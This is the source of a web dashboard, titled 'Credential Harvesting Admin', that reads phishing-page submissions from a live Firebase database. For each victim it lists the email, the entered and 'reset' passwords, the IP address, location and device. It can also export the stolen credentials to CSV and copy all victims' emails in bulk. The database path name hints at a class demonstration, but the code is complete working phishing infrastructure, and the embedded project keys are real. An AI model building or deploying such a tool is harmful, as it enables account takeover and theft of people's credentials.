<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Dashboard | Credential Harvesting</title>
    <style>
        :root {
            --bg-body: #f3f4f6;
            --bg-card: #ffffff;
            --text-primary: #111827;
            --text-secondary: #6b7280;
            --border-color: #e5e7eb;
            --primary-color: #2563eb;
            --primary-hover: #1d4ed8;
            --success-color: #10b981;
            --danger-color: #ef4444;
            --warning-color: #f59e0b;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --radius: 8px;
            --font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        * { box-sizing: border-box; outline: none; }

        body {
            margin: 0;
            background-color: var(--bg-body);
            font-family: var(--font-family);
            color: var(--text-primary);
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }

        /* Layout */
        .app-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 24px;
        }

        /* Header & Stats */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 16px;
        }

        .brand h1 {
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0;
            color: var(--text-primary);
            letter-spacing: -0.025em;
        }

        .brand p {
            margin: 4px 0 0;
            font-size: 0.875rem;
            color: var(--text-secondary);
        }

        .stats-bar {
            display: flex;
            gap: 24px;
        }

        .stat-item {
            text-align: right;
        }

        .stat-label {
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .stat-value {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--primary-color);
        }

        /* Controls */
        .controls {
            display: flex;
            gap: 16px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .search-wrapper {
            position: relative;
            flex: 1;
        }

        .search-wrapper svg {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            color: var(--text-secondary);
        }

        input[type="text"] {
            width: 100%;
            padding: 10px 16px 10px 40px;
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            font-size: 0.9rem;
            background: var(--bg-card);
            transition: all 0.2s;
        }

        input[type="text"]:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        button {
            cursor: pointer;
            font-family: inherit;
            font-weight: 500;
            border: none;
            transition: all 0.2s;
        }

        .btn {
            padding: 10px 16px;
            border-radius: var(--radius);
            font-size: 0.875rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background-color: var(--primary-color);
            color: white;
        }
        .btn-primary:hover { background-color: var(--primary-hover); }

        .btn-outline {
            background-color: white;
            border: 1px solid var(--border-color);
            color: var(--text-primary);
        }
        .btn-outline:hover { background-color: #f9fafb; border-color: #d1d5db; }

        .btn-danger-outline {
            background-color: white;
            border: 1px solid var(--danger-color);
            color: var(--danger-color);
        }
        .btn-danger-outline:hover { background-color: #fef2f2; }

        /* Table Card */
        .card {
            background: var(--bg-card);
            border-radius: var(--radius);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border-color);
            overflow: hidden;
            min-height: 600px;
            display: flex;
            flex-direction: column;
        }

        .table-header {
            padding: 16px 24px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #f9fafb;
        }

        .table-title {
            font-weight: 600;
            font-size: 1rem;
        }

        .table-actions {
            display: flex;
            gap: 10px;
        }

        .table-container {
            overflow-x: auto;
            flex: 1;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.875rem;
        }

        th {
            background: #f9fafb;
            text-align: left;
            padding: 12px 20px;
            font-weight: 600;
            color: var(--text-secondary);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: 1px solid var(--border-color);
            white-space: nowrap;
        }

        td {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border-color);
            vertical-align: middle;
            color: var(--text-primary);
        }

        tr:last-child td { border-bottom: none; }
        tr:hover { background-color: #f9fafb; }

        /* Cell Styles */
        .cell-email {
            font-weight: 600;
            color: var(--text-primary);
            max-width: 250px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .cell-password {
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 0.85rem;
            color: var(--text-secondary);
            background: #f3f4f6;
            padding: 4px 8px;
            border-radius: 4px;
            display: inline-block;
            max-width: 150px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .cell-password.reset {
            background: #ecfdf5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            padding: 2px 8px;
            border-radius: 9999px;
            font-size: 0.75rem;
            font-weight: 500;
        }

        .badge-ip { background: #eff6ff; color: #1e40af; }
        .badge-device { background: #f3f4f6; color: #374151; }

        .location-text {
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .copy-indicator {
            opacity: 0;
            font-size: 0.7rem;
            color: var(--primary-color);
            margin-left: 6px;
            transition: opacity 0.2s;
        }

        td:hover .copy-indicator { opacity: 1; }

        /* Password Strength Meter */
        .strength-meter {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.75rem;
            margin-top: 4px;
        }

        .strength-bar {
            width: 40px;
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
            overflow: hidden;
        }

        .strength-fill {
            height: 100%;
            width: 0%;
            transition: width 0.3s, background-color 0.3s;
        }

        .strength-weak .strength-fill { width: 33%; background-color: var(--danger-color); }
        .strength-medium .strength-fill { width: 66%; background-color: var(--warning-color); }
        .strength-strong .strength-fill { width: 100%; background-color: var(--success-color); }

        .strength-text {
            color: var(--text-secondary);
        }

        .delete-btn {
            background: none;
            border: none;
            color: var(--danger-color);
            cursor: pointer;
            padding: 4px;
            border-radius: 4px;
            opacity: 0.6;
            transition: opacity 0.2s;
        }

        .delete-btn:hover {
            opacity: 1;
            background-color: #fef2f2;
        }

        .empty-state {
            padding: 40px;
            text-align: center;
            color: var(--text-secondary);
        }

        /* Toast Notification */
        #toast {
            visibility: hidden;
            min-width: 250px;
            background-color: #333;
            color: #fff;
            text-align: center;
            border-radius: 4px;
            padding: 12px;
            position: fixed;
            z-index: 1000;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%);
            font-size: 0.875rem;
            opacity: 0;
            transition: opacity 0.3s, bottom 0.3s;
        }

        #toast.show {
            visibility: visible;
            opacity: 1;
            bottom: 50px;
        }
    </style>
</head>
<body>

<div class="app-container">
    <header>
        <div class="brand">
            <h1>Credential Harvesting Admin</h1>
            <p>Real-time monitoring & analytics</p>
        </div>
        <div class="stats-bar">
            <div class="stat-item">
                <div class="stat-label">Total Entries</div>
                <div class="stat-value" id="count-total">0</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">Unique IPs</div>
                <div class="stat-value" id="count-ips">0</div>
            </div>
        </div>
    </header>

    <div class="controls">
        <div class="search-wrapper">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
            </svg>
            <input type="text" id="searchInput" placeholder="Search email, password, IP, or location...">
        </div>
        <button class="btn btn-outline" onclick="refreshData()">↻ Refresh</button>
        <button class="btn btn-primary" onclick="exportCSV()">⬇ Export CSV</button>
        <button class="btn btn-outline" onclick="copyAllEmails()">📧 Copy All Emails</button>
    </div>

    <div class="card">
        <div class="table-header">
            <span class="table-title">Harvested Credentials</span>
            <div class="table-actions">
                <button class="btn btn-danger-outline" onclick="deleteAllEntries()">🗑 Delete All</button>
            </div>
        </div>
        <div class="table-container">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th style="width: 20%;">Email</th>
                        <th style="width: 12%;">Password 1</th>
                        <th style="width: 12%;">Password 2 (Reset)</th>
                        <th style="width: 10%;">IP Address</th>
                        <th style="width: 12%;">Location</th>
                        <th style="width: 8%;">Device</th>
                        <th style="width: 11%;">Time</th>
                        <th style="width: 5%;"></th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr>
                        <td colspan="8" class="empty-state">Loading data from Firebase...</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- Toast Notification -->
<div id="toast">Action completed</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    // SAME CONFIG AS YOUR SIGN-IN PAGE
    const firebaseConfig = {
        apiKey: "AIzaSyDUngpiO9vKffUbV5mQClFInB68dsD-MII",
        authDomain: "fir-9b3f9.firebaseapp.com",
        databaseURL: "https://fir-9b3f9-default-rtdb.firebaseio.com",
        projectId: "fir-9b3f9",
        storageBucket: "fir-9b3f9.firebasestorage.app",
        messagingSenderId: "392348885618",
        appId: "1:392348885618:web:442013cefdb06386db98eb"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const submissionsRef = ref(db, 'classDemoSubmissions');

    let allData = [];

    // Fetch Data Listener
    onValue(submissionsRef, (snapshot) => {
        const data = snapshot.val();
        allData = [];
        
        if (data) {
            Object.keys(data).forEach(key => {
                const item = data[key];
                allData.push({
                    id: key,
                    ...item
                });
            });

            // Sort by creation time (newest first)
            allData.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
            
            updateStats();
            renderTable(allData);
        } else {
            document.getElementById('tableBody').innerHTML = '<tr><td colspan="8" class="empty-state">No submissions yet.</td></tr>';
            updateStats();
        }
    });

    function updateStats() {
        document.getElementById('count-total').textContent = allData.length;
        const uniqueIps = new Set(allData.map(d => d.ipAddress).filter(ip => ip));
        document.getElementById('count-ips').textContent = uniqueIps.size;
    }

    function calculateStrength(password) {
        if (!password) return 'weak';
        let score = 0;
        if (password.length > 6) score++;
        if (password.length > 10) score++;
        if (/[A-Z]/.test(password)) score++;
        if (/[0-9]/.test(password)) score++;
        if (/[^A-Za-z0-9]/.test(password)) score++;

        if (score <= 2) return 'weak';
        if (score <= 4) return 'medium';
        return 'strong';
    }

    function renderTable(data) {
        const tbody = document.getElementById('tableBody');
        tbody.innerHTML = '';

        if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No matching records found.</td></tr>';
            return;
        }

        data.forEach(item => {
            const row = document.createElement('tr');
            
            // Date Formatting
            let dateStr = 'N/A';
            if (item.createdAt) {
                const date = new Date(item.createdAt);
                dateStr = date.toLocaleString(undefined, { 
                    month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' 
                });
            }

            // Location Parsing
            let locCity = '-';
            let locCountry = '-';
            
            if (item.location) {
                if (item.location.city) locCity = item.location.city;
                if (item.location.country_name) locCountry = item.location.country_name;
                else if (item.location.country) locCountry = item.location.country;
            }

            // Device Detection
            let deviceText = 'Unknown';
            if (item.userAgent) {
                const ua = item.userAgent;
                if (ua.includes('Windows')) deviceText = 'Windows';
                else if (ua.includes('Macintosh') || ua.includes('iPhone')) deviceText = 'Apple';
                else if (ua.includes('Linux') || ua.includes('Android')) deviceText = 'Linux/Android';
                
                // Browser detection
                if (ua.includes('Chrome')) deviceText += ' / Chrome';
                else if (ua.includes('Firefox')) deviceText += ' / Firefox';
                else if (ua.includes('Safari')) deviceText += ' / Safari';
            }

            // Password Strength
            const p1Strength = calculateStrength(item.password1);
            const p2Strength = calculateStrength(item.password2);

            row.innerHTML = `
                <td class="cell-email" onclick="copyToClipboard('${escapeAttr(item.email)}')" title="${escapeHtml(item.email)}">
                    ${escapeHtml(item.email)}
                    <span class="copy-indicator">📋 Copy</span>
                </td>
                <td onclick="copyToClipboard('${escapeAttr(item.password1)}')">
                    <span class="cell-password">${escapeHtml(item.password1)}</span>
                    <div class="strength-meter strength-${p1Strength}">
                        <div class="strength-bar"><div class="strength-fill"></div></div>
                        <span class="strength-text">${p1Strength}</span>
                    </div>
                    <span class="copy-indicator">📋 Copy</span>
                </td>
                <td onclick="copyToClipboard('${escapeAttr(item.password2)}')">
                    <span class="cell-password reset">${escapeHtml(item.password2)}</span>
                    <div class="strength-meter strength-${p2Strength}">
                        <div class="strength-bar"><div class="strength-fill"></div></div>
                        <span class="strength-text">${p2Strength}</span>
                    </div>
                    <span class="copy-indicator">📋 Copy</span>
                </td>
                <td onclick="copyToClipboard('${escapeAttr(item.ipAddress)}')">
                    <span class="badge badge-ip">${escapeHtml(item.ipAddress || 'N/A')}</span>
                </td>
                <td>
                    <div class="location-text">${locCity}, ${locCountry}</div>
                </td>
                <td>
                    <span class="badge badge-device">${deviceText}</span>
                </td>
                <td style="color: var(--text-secondary); font-size: 0.8rem;">${dateStr}</td>
                <td>
                    <button class="delete-btn" onclick="deleteEntry('${item.id}')" title="Delete Entry">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="3 6 5 6 21 6"></polyline>
                            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                        </svg>
                    </button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }

    // Global functions for HTML events
    window.refreshData = () => {
        // Force re-read
        onValue(submissionsRef, (snapshot) => {
             // Just triggers the listener again
        });
        showToast("Data refreshed");
    };

    window.exportCSV = () => {
        if (allData.length === 0) {
            alert("No data to export.");
            return;
        }

        const headers = ["Email", "Password1", "Password2", "IPAddress", "City", "Country", "UserAgent", "Timestamp"];
        
        const rows = allData.map(item => {
            const city = item.location?.city || "";
            const country = item.location?.country || "";
            const timestamp = item.createdAt ? new Date(item.createdAt).toLocaleString() : "";
            
            return [
                `"${(item.email || "").replace(/"/g, '""')}"`,
                `"${(item.password1 || "").replace(/"/g, '""')}"`,
                `"${(item.password2 || "").replace(/"/g, '""')}"`,
                `"${(item.ipAddress || "").replace(/"/g, '""')}"`,
                `"${city.replace(/"/g, '""')}"`,
                `"${country.replace(/"/g, '""')}"`,
                `"${(item.userAgent || "").replace(/"/g, '""')}"`,
                `"${timestamp}"`
            ].join(",");
        });

        const csvContent = [headers.join(","), ...rows].join("\n");
        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement("a");
        const url = URL.createObjectURL(blob);
        link.setAttribute("href", url);
        link.setAttribute("download", `credentials_harvest_${new Date().toISOString().slice(0,10)}.csv`);
        link.style.visibility = 'hidden';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        showToast("CSV exported successfully");
    };

    window.copyAllEmails = () => {
        if (allData.length === 0) {
            alert("No emails to copy.");
            return;
        }
        const emails = allData.map(d => d.email).join(', ');
        navigator.clipboard.writeText(emails).then(() => {
            showToast(`Copied ${allData.length} emails to clipboard`);
        });
    };

    window.filterTable = () => {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = allData.filter(item => {
            const str = JSON.stringify(item).toLowerCase();
            return str.includes(query);
        });
        renderTable(filtered);
    };

    window.deleteEntry = (id) => {
        if(confirm("Are you sure you want to delete this entry?")) {
            const entryRef = ref(db, `classDemoSubmissions/${id}`);
            remove(entryRef).then(() => {
                showToast("Entry deleted");
            }).catch(err => {
                console.error("Deletion failed:", err);
                showToast("Failed to delete");
            });
        }
    };

    window.deleteAllEntries = () => {
        if(confirm("Are you sure you want to delete ALL entries? This cannot be undone.")) {
            const batchRef = ref(db, 'classDemoSubmissions');
            remove(batchRef).then(() => {
                showToast("All entries deleted");
            }).catch(err => {
                console.error("Batch deletion failed:", err);
                showToast("Failed to delete all");
            });
        }
    };

    window.copyToClipboard = (text) => {
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            showToast("Copied to clipboard");
        }).catch(err => {
            console.error('Failed to copy: ', err);
        });
    };

    function showToast(message) {
        const toast = document.getElementById("toast");
        toast.textContent = message;
        toast.className = "show";
        setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
    }

    function escapeHtml(text) {
        if (!text) return "";
        return text
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function escapeAttr(text) {
        if (!text) return "";
        return text.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
    }

    // Search Listener
    document.getElementById('searchInput').addEventListener('input', window.filterTable);
</script>

</body>
</html>
